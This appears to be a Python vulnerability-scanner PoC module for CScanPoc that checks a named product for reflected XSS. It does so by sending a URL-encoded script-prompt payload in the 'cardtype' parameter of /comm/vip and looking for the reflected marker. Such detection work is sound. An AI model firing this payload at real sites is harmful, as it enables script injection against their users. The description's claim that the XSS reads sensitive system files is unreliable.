# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Airkunming_0101' # 平台漏洞编号
    name = 'Airkunming反射型XSS打包' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2016-05-26'  # 漏洞公布时间
    desc = '''模版漏洞描述
    Airkunming反射型XSS打包漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=194976
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Airkunming'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '76462f2c-80d0-470a-bdeb-184ea61d5ead' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/comm/vip?cardtype=11%27%22%28%29%26%25%3Cacx%3E%3CScRiPt%20%3Eprompt%28/Cscan-hyhmnn/%29%3C/ScRiPt%3E"
            url = self.target + payload
            response = requests.get(url)
            if response.status_code==200 and "/Cscan-hyhmnn/" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()